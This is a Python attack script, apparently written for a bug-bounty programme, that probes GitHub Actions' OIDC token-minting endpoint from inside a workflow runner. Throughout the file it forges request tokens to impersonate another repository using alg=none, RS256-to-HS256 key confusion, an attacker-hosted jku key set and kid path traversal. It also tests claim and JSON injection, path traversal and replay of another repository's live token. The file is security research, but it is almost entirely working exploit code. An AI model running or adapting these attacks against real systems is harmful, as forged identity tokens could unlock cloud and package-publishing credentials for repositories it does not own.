#!/usr/bin/env python3
"""In-runner binding battery against the Actions OIDC mint endpoint.

Runs inside a GitHub-hosted runner in a repo we own. Every request goes to the
job's own ACTIONS_ID_TOKEN_REQUEST_URL host (*.actions.githubusercontent.com,
covered by the *.githubusercontent.com wildcard in targets/github/SCOPE.txt).
Sequential singles, >=1.0s spacing, no bursts.
"""
import base64
import hashlib
import hmac
import json
import os
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

URL = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
TOK = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
XURL = os.environ.get("X_URL", "")
XTOK = os.environ.get("X_TOK", "")
ONLY = os.environ.get("ONLY", "")
_last = [0.0]


def b64u(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def d64(s):
    s += "=" * (-len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))


def parts(t):
    a = t.split(".")
    return d64(a[0]), d64(a[1]), a[2]


def fire(tag, url, tok, hdrs=None, method="GET", note="", body=None):
    dt = time.time() - _last[0]
    if dt < 1.05:
        time.sleep(1.05 - dt)
    _last[0] = time.time()
    h = {"Accept": "application/json", "User-Agent": "bb-research", "X-HackerOne": "larocas"}
    if tok is not None:
        h["Authorization"] = "bearer " + tok
    if hdrs:
        h.update(hdrs)
    req = urllib.request.Request(url, method=method, headers=h,
                                 data=body.encode() if body else None)
    try:
        with urllib.request.urlopen(req, context=ssl.create_default_context(), timeout=30) as r:
            st, raw = r.status, r.read()
    except urllib.error.HTTPError as e:
        st, raw = e.code, e.read()
    except Exception as e:
        st, raw = -1, ("EXC " + type(e).__name__ + " " + str(e)[:200]).encode()
    txt = raw.decode("utf-8", "replace")
    print("\n" + "=" * 70)
    print("[%s] %s" % (tag, note))
    print("REQ %s %s" % (method, url[:400]))
    print("RESP %s len=%d" % (st, len(raw)))
    v = "NO-MINT"
    try:
        j = json.loads(txt)
        if isinstance(j, dict) and "value" in j:
            c = d64(j["value"].split(".")[1])
            v = "MINT sub=%s | repo=%s | aud=%s | run_id=%s | jti=%s" % (
                c.get("sub"), c.get("repository"), c.get("aud"), c.get("run_id"), c.get("jti"))
            print("CLAIMS " + json.dumps(c, sort_keys=True))
        else:
            print("BODY " + txt[:500])
    except Exception:
        print("BODY " + txt[:500])
    print("VERDICT %s" % v)
    return st, txt


def sel(tag):
    return (not ONLY) or tag in ONLY.split(",")


print("NATIVE-URL", URL)
base, q = (URL.split("?", 1) + [""])[:2]
qs = dict(urllib.parse.parse_qsl(q))
seg = base.split("/")
# .../<coll>//idtoken/<plan>/<job>
plan, job = seg[-2], seg[-1]
coll = seg[3]
print("PARSED coll=%s plan=%s job=%s" % (coll, plan, job))
hdr, pay, sig = parts(TOK)
print("REQTOK hdr", json.dumps(hdr))
print("REQTOK scp", pay.get("scp"))
Z = "00000000-0000-0000-0000-000000000000"
R = "11111111-2222-3333-4444-555555555555"

# ---- group A: is the token consumed / how free is `audience`
if sel("A"):
    fire("A01-posctl", URL + "&audience=a01", TOK, note="in-run positive control")
    fire("A02-reuse", URL + "&audience=a02", TOK, note="second mint from the SAME request token (consumption test)")
    fire("A03-reuse3", URL + "&audience=a03", TOK, note="third mint, same token")
    fire("A04-noaud", URL, TOK, note="audience parameter omitted entirely")
    fire("A05-emptyaud", URL + "&audience=", TOK, note="empty audience")
    fire("A06-npmaud", URL + "&audience=" + urllib.parse.quote("npm:registry.npmjs.org"), TOK,
         note="npm trusted-publishing audience")
    fire("A07-stsaud", URL + "&audience=sts.amazonaws.com", TOK, note="AWS STS audience")
    fire("A08-dupaud", URL + "&audience=first&audience=second", TOK, note="duplicate audience params (HPP)")
    fire("A09-longaud", URL + "&audience=" + ("A" * 3000), TOK, note="3000-char audience")
    fire("A10-crlfaud", URL + "&audience=" + urllib.parse.quote('x", "sub": "repo:evil/evil:ref:refs/heads/main'),
         TOK, note="JSON-injection shaped audience")

# ---- group B: can any OTHER claim be steered from the request
if sel("B"):
    for p in ["sub", "repository", "repository_id", "repository_owner", "oidc_sub",
              "job_workflow_ref", "workflow_ref", "actor", "ref", "environment", "claims", "scope"]:
        fire("B-%s" % p, URL + "&audience=b-%s&%s=%s" % (p, p, urllib.parse.quote("evil-org/evil-repo")), TOK,
             note="extra query param %s= injected alongside audience" % p)

# ---- group C: URL / path binding
if sel("C"):
    fire("C01-jobzero", base.rsplit("/", 1)[0] + "/" + Z + "?api-version=2.0&audience=c01", TOK,
         note="job GUID replaced with all-zero GUID")
    fire("C02-jobrand", base.rsplit("/", 1)[0] + "/" + R + "?api-version=2.0&audience=c02", TOK,
         note="job GUID replaced with a random GUID")
    fire("C03-planzero", base.rsplit("/", 2)[0] + "/" + Z + "/" + job + "?api-version=2.0&audience=c03", TOK,
         note="plan GUID replaced with all-zero GUID")
    fire("C04-planrand", base.rsplit("/", 2)[0] + "/" + R + "/" + job + "?api-version=2.0&audience=c04", TOK,
         note="plan GUID replaced with a random GUID")
    fire("C05-swap", base.rsplit("/", 2)[0] + "/" + job + "/" + plan + "?api-version=2.0&audience=c05", TOK,
         note="plan and job GUIDs swapped")
    fire("C06-coll", base.replace("/%s//" % coll, "/%s//" % (int(coll) + 1), 1) + "?api-version=2.0&audience=c06", TOK,
         note="collection segment %s -> %s" % (coll, int(coll) + 1))
    fire("C07-singleslash", base.replace("//idtoken/", "/idtoken/") + "?api-version=2.0&audience=c07", TOK,
         note="the doubled slash collapsed to one")
    fire("C08-apiv1", base + "?api-version=1.0&audience=c08", TOK, note="api-version=1.0")
    fire("C09-apiv6", base + "?api-version=6.0-preview&audience=c09", TOK, note="api-version=6.0-preview")
    fire("C10-noapiv", base + "?audience=c10", TOK, note="api-version omitted")
    fire("C11-traversal", base.rsplit("/", 2)[0] + "/" + Z + "/" + Z + "/../../" + plan + "/" + job +
         "?api-version=2.0&audience=c11", TOK, note="dot-dot traversal back to the real plan/job")
    fire("C12-encslash", base.rsplit("/", 2)[0] + "/" + plan + "%2f" + job + "?api-version=2.0&audience=c12", TOK,
         note="encoded slash between plan and job")
    fire("C13-post", URL + "&audience=c13", TOK, method="POST", body="{}",
         note="POST instead of GET")
    fire("C14-noauth", URL + "&audience=c14", None, note="Authorization header removed (negative control)")
    fire("C15-basic", URL + "&audience=c15", TOK, hdrs={"Authorization": "Basic " + b64u(b"x:y")},
         note="Basic scheme instead of bearer")
    fire("C16-xfwd", URL + "&audience=c16", TOK,
         hdrs={"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "token.actions.githubusercontent.com",
               "X-Real-IP": "127.0.0.1"}, note="forwarding headers")

# ---- group D: request-token forgery (the claims are carried BY this token)
if sel("D"):
    ex = json.loads(pay.get("oidc_extra", "{}"))
    ev = dict(pay)
    ex2 = dict(ex)
    ex2["repository"] = "torvalds/linux"
    ex2["repository_id"] = "2325298"
    ex2["repository_owner"] = "torvalds"
    ex2["repository_owner_id"] = "1024025"
    ev["oidc_extra"] = json.dumps(ex2)
    ev["oidc_sub"] = "repo:torvalds@1024025/linux@2325298:ref:refs/heads/main"
    hp = b64u(json.dumps(hdr).encode()) + "." + b64u(json.dumps(ev).encode())

    fire("D01-tamper-origsig", URL + "&audience=d01", hp + "." + sig,
         note="oidc_extra.repository rewritten, ORIGINAL signature kept (signature-check test)")
    h_none = dict(hdr)
    h_none["alg"] = "none"
    fire("D02-algnone", URL + "&audience=d02",
         b64u(json.dumps(h_none).encode()) + "." + b64u(json.dumps(ev).encode()) + ".",
         note="alg=none, empty signature, repository claim rewritten")
    h_None = dict(hdr)
    h_None["alg"] = "NoNe"
    fire("D03-algNoNe", URL + "&audience=d03",
         b64u(json.dumps(h_None).encode()) + "." + b64u(json.dumps(ev).encode()) + ".",
         note="alg=NoNe case variant")
    # RS256 -> HS256 confusion using the PUBLIC JWKS key as the HMAC secret
    try:
        with urllib.request.urlopen("https://token.actions.githubusercontent.com/.well-known/jwks", timeout=20) as r:
            jw = json.loads(r.read())
        key = [k for k in jw["keys"] if k["kid"] == hdr.get("kid")]
        pem = None
        if key:
            from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
            from cryptography.hazmat.primitives import serialization
            k = key[0]

            def i(x):
                return int.from_bytes(base64.urlsafe_b64decode(x + "=" * (-len(x) % 4)), "big")
            pub = RSAPublicNumbers(i(k["e"]), i(k["n"])).public_key()
            pem = pub.public_bytes(serialization.Encoding.PEM,
                                   serialization.PublicFormat.SubjectPublicKeyInfo)
        if pem:
            h_hs = dict(hdr)
            h_hs["alg"] = "HS256"
            sp = b64u(json.dumps(h_hs).encode()) + "." + b64u(json.dumps(ev).encode())
            for label, secret in [("pem", pem), ("pem-strip", pem.strip()),
                                  ("kid", hdr.get("kid", "").encode()), ("empty", b"")]:
                mac = b64u(hmac.new(secret, sp.encode(), hashlib.sha256).digest())
                fire("D04-hs256-%s" % label, URL + "&audience=d04" + label, sp + "." + mac,
                     note="RS256->HS256 confusion, HMAC key = %s" % label)
        else:
            print("no matching JWKS key for kid", hdr.get("kid"))
    except Exception as e:
        print("HS256 leg failed:", type(e).__name__, e)
    # header-injection legs
    h_jku = dict(hdr)
    h_jku["jku"] = "https://raw.githubusercontent.com/darrocarocatest-sys/tp-oidc-b/main/jwks.json"
    fire("D05-jku", URL + "&audience=d05",
         b64u(json.dumps(h_jku).encode()) + "." + b64u(json.dumps(ev).encode()) + "." + sig,
         note="jku header pointing at a JWKS we control (raw.githubusercontent.com)")
    h_kid = dict(hdr)
    h_kid["kid"] = "../../../../dev/null"
    fire("D06-kidtraversal", URL + "&audience=d06",
         b64u(json.dumps(h_kid).encode()) + "." + b64u(json.dumps(ev).encode()) + "." + sig,
         note="kid path traversal")
    # expiry / scope tamper with original signature
    ev2 = dict(pay)
    ev2["scp"] = pay.get("scp", "").replace(job, Z)
    fire("D07-scptamper", URL + "&audience=d07",
         b64u(json.dumps(hdr).encode()) + "." + b64u(json.dumps(ev2).encode()) + "." + sig,
         note="scp claim job GUID rewritten, original signature")

# ---- group E: a foreign repo's live request token against THIS job's URL (and reverse)
if sel("E") and XTOK:
    xbase = (XURL.split("?", 1) + [""])[0]
    fire("E01-foreign-tok-own-url", URL + "&audience=e01", XTOK,
         note="OTHER repo's live request token against THIS job's URL")
    fire("E02-own-tok-foreign-url", xbase + "?api-version=2.0&audience=e02", TOK,
         note="THIS job's token against the OTHER repo's URL")
    fire("E03-foreign-both", xbase + "?api-version=2.0&audience=e03", XTOK,
         note="OTHER repo's token against the OTHER repo's URL (cross-check control)")
print("\n---BATTERY-DONE---")
